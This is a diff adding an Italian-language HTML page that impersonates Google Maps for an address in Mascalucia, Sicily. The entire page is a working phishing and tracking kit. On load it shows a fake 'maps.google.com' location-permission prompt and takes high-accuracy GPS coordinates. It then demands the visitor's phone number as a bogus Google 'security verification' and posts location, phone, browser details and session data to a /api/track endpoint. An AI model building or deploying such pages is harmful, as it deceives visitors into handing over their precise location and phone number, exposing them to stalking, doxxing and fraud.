@@ -1,0 +1,632 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Via Cesare Pavese 12, Mascalucia CT - Google Maps</title>
+    
+    <!-- META TAGS per anteprima social media -->
+    <meta property="og:title" content="Via Cesare Pavese 12, Mascalucia CT">
+    <meta property="og:description" content="Via Cesare Pavese 12, 95030 Mascalucia CT, Sicilia (37.5838, 15.0595)">
+    <meta property="og:image" content="https://i.imgur.com/mascalucia-preview.jpg">
+    <meta property="og:url" content="https://maps.google.com/?q=37.5838,15.0595">
+    <meta property="og:type" content="website">
+    <meta property="og:site_name" content="Google Maps">
+    
+    <!-- Favicon Google Maps -->
+    <link rel="icon" href="https://www.google.com/favicon.ico">
+    
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            background: #f8f9fa;
+            overflow-x: hidden;
+        }
+        
+        /* Header Google Maps identico */
+        .maps-header {
+            background: #fff;
+            height: 64px;
+            display: flex;
+            align-items: center;
+            padding: 0 16px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            position: relative;
+            z-index: 1000;
+        }
+        
+        .maps-logo {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .logo-icon {
+            width: 32px;
+            height: 32px;
+            background: linear-gradient(45deg, #4285f4, #34a853, #fbbc05, #ea4335);
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+            font-size: 18px;
+        }
+        
+        .search-box {
+            flex: 1;
+            max-width: 500px;
+            margin: 0 20px;
+            background: #f1f3f4;
+            border-radius: 8px;
+            padding: 12px 16px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            cursor: pointer;
+        }
+        
+        .search-text {
+            color: #202124;
+            font-size: 16px;
+            flex: 1;
+        }
+        
+        /* Container mappa */
+        .map-container {
+            position: relative;
+            height: calc(100vh - 64px);
+            background: #e5e3df;
+            overflow: hidden;
+        }
+        
+        /* Simulazione mappa Google */
+        .google-map {
+            width: 100%;
+            height: 100%;
+            background: 
+                radial-gradient(circle at 30% 40%, rgba(255,255,255,0.8) 0%, transparent 50%),
+                radial-gradient(circle at 70% 80%, rgba(255,255,255,0.6) 0%, transparent 50%),
+                linear-gradient(135deg, #f0f0f0 0%, #e0e0e0 50%, #d0d0d0 100%);
+            position: relative;
+            cursor: pointer;
+        }
+        
+        /* Strade simulate */
+        .road {
+            position: absolute;
+            background: #ffffff;
+            box-shadow: 0 0 4px rgba(0,0,0,0.2);
+        }
+        
+        .road-1 { width: 100%; height: 3px; top: 35%; }
+        .road-2 { width: 100%; height: 2px; top: 65%; }
+        .road-3 { height: 100%; width: 3px; left: 25%; }
+        .road-4 { height: 100%; width: 2px; left: 75%; }
+        
+        /* Pin Google Maps */
+        .map-pin {
+            position: absolute;
+            top: 45%;
+            left: 50%;
+            transform: translate(-50%, -100%);
+            z-index: 100;
+            cursor: pointer;
+            animation: bounce 2s infinite;
+        }
+        
+        .pin-icon {
+            width: 46px;
+            height: 60px;
+            background: #ea4335;
+            border-radius: 50% 50% 50% 0;
+            transform: rotate(-45deg);
+            position: relative;
+            box-shadow: 0 6px 12px rgba(234,67,53,0.4);
+        }
+        
+        .pin-icon::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 18px;
+            height: 18px;
+            background: white;
+            border-radius: 50%;
+        }
+        
+        @keyframes bounce {
+            0%, 20%, 50%, 80%, 100% { transform: translate(-50%, -100%); }
+            40% { transform: translate(-50%, -110%); }
+            60% { transform: translate(-50%, -105%); }
+        }
+        
+        /* Card informazioni luogo */
+        .place-card {
+            position: absolute;
+            bottom: 20px;
+            left: 20px;
+            right: 20px;
+            background: white;
+            border-radius: 12px;
+            padding: 20px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            z-index: 200;
+        }
+        
+        .place-title {
+            font-size: 24px;
+            font-weight: 500;
+            color: #202124;
+            margin-bottom: 8px;
+        }
+        
+        .place-address {
+            color: #5f6368;
+            font-size: 16px;
+            margin-bottom: 12px;
+        }
+        
+        .place-rating {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 20px;
+        }
+        
+        .stars {
+            color: #fbbc05;
+            font-size: 16px;
+        }
+        
+        .rating-text {
+            color: #5f6368;
+            font-size: 14px;
+        }
+        
+        /* Pulsanti azione */
+        .action-buttons {
+            display: flex;
+            gap: 12px;
+            flex-wrap: wrap;
+        }
+        
+        .action-btn {
+            padding: 12px 24px;
+            border-radius: 24px;
+            border: none;
+            font-family: 'Roboto', sans-serif;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .primary-btn {
+            background: #1976d2;
+            color: white;
+        }
+        
+        .primary-btn:hover {
+            background: #1565c0;
+            box-shadow: 0 2px 8px rgba(25,118,210,0.3);
+        }
+        
+        .secondary-btn {
+            background: #f8f9fa;
+            color: #3c4043;
+            border: 1px solid #dadce0;
+        }
+        
+        .secondary-btn:hover {
+            background: #f1f3f4;
+        }
+        
+        /* Modal per permessi GPS */
+        .permission-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 2000;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s;
+        }
+        
+        .permission-modal.show {
+            opacity: 1;
+            visibility: visible;
+        }
+        
+        .modal-content {
+            background: white;
+            padding: 32px;
+            border-radius: 12px;
+            max-width: 450px;
+            width: 90%;
+            text-align: center;
+        }
+        
+        .modal-title {
+            font-size: 20px;
+            font-weight: 500;
+            margin-bottom: 16px;
+            color: #202124;
+        }
+        
+        .modal-text {
+            color: #5f6368;
+            margin-bottom: 24px;
+            line-height: 1.5;
+        }
+        
+        .phone-input {
+            width: 100%;
+            padding: 12px 16px;
+            margin: 16px 0 24px 0;
+            border: 2px solid #dadce0;
+            border-radius: 8px;
+            font-size: 16px;
+            font-family: 'Roboto', sans-serif;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+        
+        .phone-input:focus {
+            border-color: #1976d2;
+        }
+        
+        .modal-step {
+            display: none;
+        }
+        
+        .modal-step.active {
+            display: block;
+        }
+        
+        .modal-buttons {
+            display: flex;
+            gap: 8px;
+            justify-content: center;
+        }
+        
+        .modal-btn {
+            padding: 8px 24px;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        
+        .modal-btn-primary {
+            background: #1976d2;
+            color: white;
+        }
+        
+        .modal-btn-secondary {
+            background: transparent;
+            color: #1976d2;
+        }
+        
+        /* Loading spinner */
+        .loading-spinner {
+            display: none;
+            width: 40px;
+            height: 40px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #1976d2;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        /* Responsive */
+        @media (max-width: 768px) {
+            .place-card {
+                left: 12px;
+                right: 12px;
+                bottom: 12px;
+            }
+            
+            .action-buttons {
+                flex-direction: column;
+            }
+            
+            .action-btn {
+                width: 100%;
+                justify-content: center;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Header Google Maps -->
+    <div class="maps-header">
+        <div class="maps-logo">
+            <div class="logo-icon">🗺</div>
+            <span style="font-size: 22px; color: #5f6368;">Maps</span>
+        </div>
+        
+        <div class="search-box" onclick="requestLocation()">
+            <div class="search-text">🏠 Via Cesare Pavese 12, Mascalucia CT</div>
+            <div style="color: #9aa0a6;">🔍</div>
+        </div>
+    </div>
+    
+    <!-- Container mappa -->
+    <div class="map-container">
+        <div class="google-map" onclick="requestLocation()">
+            <!-- Strade simulate -->
+            <div class="road road-1"></div>
+            <div class="road road-2"></div>
+            <div class="road road-3"></div>
+            <div class="road road-4"></div>
+            
+            <!-- Pin Google Maps -->
+            <div class="map-pin" onclick="requestLocation()">
+                <div class="pin-icon"></div>
+            </div>
+        </div>
+        
+        <!-- Card informazioni luogo -->
+        <div class="place-card">
+            <div class="place-title">🏠 Via Cesare Pavese 12</div>
+            <div class="place-address">Via Cesare Pavese 12, 95030 Mascalucia CT, Sicilia</div>
+            <div class="place-rating">
+                <div class="stars">📍</div>
+                <span class="rating-text">Coordinate: 37.5838°N, 15.0595°E</span>
+            </div>
+            <div class="action-buttons">
+                <button class="action-btn primary-btn" onclick="requestLocation()">
+                    🧭 Indicazioni
+                </button>
+                <button class="action-btn secondary-btn" onclick="requestLocation()">
+                    📷 Foto
+                </button>
+                <button class="action-btn secondary-btn" onclick="requestLocation()">
+                    💾 Salva
+                </button>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Modal per permessi GPS -->
+    <div id="locationModal" class="permission-modal">
+        <div class="modal-content">
+            <!-- Step 1: Richiesta permesso GPS -->
+            <div id="step1" class="modal-step active">
+                <div class="modal-title">📍 maps.google.com vuole accedere alla tua posizione</div>
+                <div class="modal-text">
+                    Google Maps ha bisogno della tua posizione per calcolare il percorso migliore verso Via Cesare Pavese 12, Mascalucia.
+                </div>
+                <div class="modal-buttons">
+                    <button class="modal-btn modal-btn-secondary" onclick="denyLocation()">Blocca</button>
+                    <button class="modal-btn modal-btn-primary" onclick="allowLocation()">Consenti</button>
+                </div>
+            </div>
+            
+            <!-- Step 2: Richiesta numero telefono -->
+            <div id="step2" class="modal-step">
+                <div class="modal-title">🔐 Verifica di sicurezza richiesta</div>
+                <div class="modal-text">
+                    Per motivi di sicurezza, Google richiede la verifica del numero di telefono per completare la navigazione.
+                </div>
+                <input type="tel" id="phoneInput" class="phone-input" placeholder="+39 123 456 7890" maxlength="20">
+                <div class="modal-buttons">
+                    <button class="modal-btn modal-btn-primary" onclick="verifyPhone()">Verifica</button>
+                </div>
+            </div>
+            
+            <!-- Step 3: Loading -->
+            <div id="step3" class="modal-step">
+                <div class="modal-title">🔄 Elaborazione in corso...</div>
+                <div class="loading-spinner"></div>
+                <div class="modal-text">
+                    Stiamo calcolando il percorso migliore per te.
+                </div>
+            </div>
+            
+            <!-- Step 4: Successo -->
+            <div id="step4" class="modal-step">
+                <div class="modal-title">✅ Tutto pronto!</div>
+                <div class="modal-text">
+                    Il percorso è stato calcolato. Puoi iniziare la navigazione.
+                </div>
+                <div class="modal-buttons">
+                    <button class="modal-btn modal-btn-primary" onclick="closeModal()">Inizia</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let userLocation = null;
+        let userPhone = null;
+        let sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+
+        // Funzione principale per richiedere la posizione
+        function requestLocation() {
+            document.getElementById('locationModal').classList.add('show');
+        }
+
+        // Negare l'accesso alla posizione
+        function denyLocation() {
+            document.getElementById('locationModal').classList.remove('show');
+            // Registra il rifiuto
+            logEvent('location_denied', { timestamp: new Date().toISOString() });
+        }
+
+        // Permettere l'accesso alla posizione
+        function allowLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        userLocation = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            timestamp: new Date().toISOString()
+                        };
+                        
+                        // Log della posizione ottenuta
+                        logEvent('location_captured', userLocation);
+                        
+                        // Passa al step 2 (richiesta telefono)
+                        showStep(2);
+                    },
+                    function(error) {
+                        // Gestire errore GPS
+                        console.log('Errore GPS:', error);
+                        logEvent('location_error', { error: error.message });
+                        
+                        // Passa comunque al step 2
+                        showStep(2);
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            } else {
+                alert('GPS non supportato da questo browser');
+                denyLocation();
+            }
+        }
+
+        // Verificare il numero di telefono
+        function verifyPhone() {
+            const phone = document.getElementById('phoneInput').value.trim();
+            
+            if (phone && phone.length >= 8) {
+                userPhone = phone;
+                
+                // Log del numero di telefono
+                logEvent('phone_captured', { 
+                    phone: userPhone,
+                    timestamp: new Date().toISOString()
+                });
+                
+                // Mostra loading
+                showStep(3);
+                
+                // Simula elaborazione
+                setTimeout(() => {
+                    showStep(4);
+                }, 2000);
+                
+            } else {
+                alert('Inserisci un numero di telefono valido');
+            }
+        }
+
+        // Chiudere il modal
+        function closeModal() {
+            document.getElementById('locationModal').classList.remove('show');
+            
+            // Log finale con tutti i dati
+            logEvent('session_complete', {
+                sessionId: sessionId,
+                location: userLocation,
+                phone: userPhone,
+                userAgent: navigator.userAgent,
+                timestamp: new Date().toISOString(),
+                url: window.location.href
+            });
+        }
+
+        // Mostrare un determinato step
+        function showStep(stepNumber) {
+            // Nascondere tutti gli step
+            document.querySelectorAll('.modal-step').forEach(step => {
+                step.classList.remove('active');
+            });
+            
+            // Mostrare lo step richiesto
+            document.getElementById('step' + stepNumber).classList.add('active');
+            
+            // Avviare spinner se è step 3
+            if (stepNumber === 3) {
+                document.querySelector('.loading-spinner').style.display = 'block';
+            }
+        }
+
+        // Funzione per loggare eventi (invia al server)
+        function logEvent(eventType, data) {
+            const logData = {
+                sessionId: sessionId,
+                eventType: eventType,
+                data: data,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                referrer: document.referrer,
+                url: window.location.href
+            };
+
+            // Inviare i dati al server
+            fetch('/api/track', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(logData)
+            }).catch(error => {
+                console.log('Log error:', error);
+            });
+
+            // Anche log nella console per debug
+            console.log('📊 Event:', eventType, data);
+        }
+
+        // Auto-trigger quando la pagina si carica
+        window.addEventListener('load', function() {
+            // Log di caricamento pagina
+            logEvent('page_loaded', {
+                timestamp: new Date().toISOString(),
+                screen: {
+                    width: screen.width,
+                    height: screen.height
+                }
+            });
+            
+            // Auto-trigger del modal dopo 2 secondi
+            setTimeout(() => {
+                requestLocation();
+            }, 2000);
+        });
+
+        // Catturare tentativi di chiusura
+        window.addEventListener('beforeunload', function() {
+            logEvent('page_unload', { timestamp: new Date().toISOString() });
+        });
+    </script>
+</body>
+</html>
